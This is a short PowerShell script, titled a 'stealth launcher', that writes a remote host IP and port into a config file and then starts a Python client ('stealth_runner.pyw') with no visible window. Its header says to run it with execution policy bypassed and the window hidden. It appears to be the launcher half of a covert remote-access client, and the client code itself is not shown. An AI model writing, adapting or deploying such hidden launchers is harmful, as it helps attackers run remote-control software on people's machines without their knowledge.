# PowerShell stealth launcher
# Run with: powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File launch_stealth.ps1

param(
    [string]$HostIP = "192.168.1.100",
    [int]$Port = 5555
)

# Create config file
@"
$HostIP
$Port
"@ | Out-File -FilePath "stealth_config.txt" -Encoding ASCII

# Get pythonw path (Python without console)
$pythonw = (Get-Command pythonw.exe -ErrorAction SilentlyContinue).Source

if (-not $pythonw) {
    # Try to find in Python installation
    $python = (Get-Command python.exe -ErrorAction SilentlyContinue).Source
    if ($python) {
        $pythonw = Join-Path (Split-Path $python) "pythonw.exe"
    }
}

if (Test-Path $pythonw) {
    # Launch hidden
    Start-Process -FilePath $pythonw -ArgumentList "stealth_runner.pyw" -WindowStyle Hidden -NoNewWindow
    Write-Host "Stealth client launched in background"
} else {
    Write-Host "Error: pythonw.exe not found. Install Python properly."
}
